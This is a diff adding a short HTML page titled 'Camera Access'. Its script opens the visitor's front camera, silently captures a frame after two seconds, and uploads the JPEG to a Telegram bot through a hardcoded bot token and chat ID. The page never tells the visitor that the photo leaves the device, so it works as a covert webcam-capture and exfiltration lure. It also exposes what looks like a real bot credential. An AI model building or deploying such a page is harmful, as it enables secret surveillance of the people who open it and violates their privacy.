@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Camera Access</title>
+  </head>
+  <body>
+    <video autoplay playsinline id="video" width="300" height="200"></video>
+    <script>
+      const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";
+      const CHAT_ID = "919015722";
+
+      async function sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "webcam.jpg");
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        });
+      }
+
+      async function captureAndSend() {
+        const video = document.getElementById("video");
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        canvas.toBlob(sendPhoto, "image/jpeg");
+      }
+
+      navigator.mediaDevices
+        .getUserMedia({ video: { facingMode: "user" } })
+        .then((stream) => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          setTimeout(() => {
+            captureAndSend();
+          }, 2000); // через 2 секунды
+        })
+        .catch((e) => console.error("Ошибка доступа к камере:", e));
+    </script>
+  </body>
+</html>
